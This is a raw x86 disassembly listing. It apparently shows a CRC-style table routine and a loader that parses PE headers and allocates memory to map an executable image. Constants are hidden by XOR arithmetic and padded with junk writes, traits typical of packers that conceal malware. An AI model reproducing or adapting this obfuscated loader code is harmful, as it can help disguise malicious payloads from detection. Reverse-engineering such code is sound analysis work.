  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
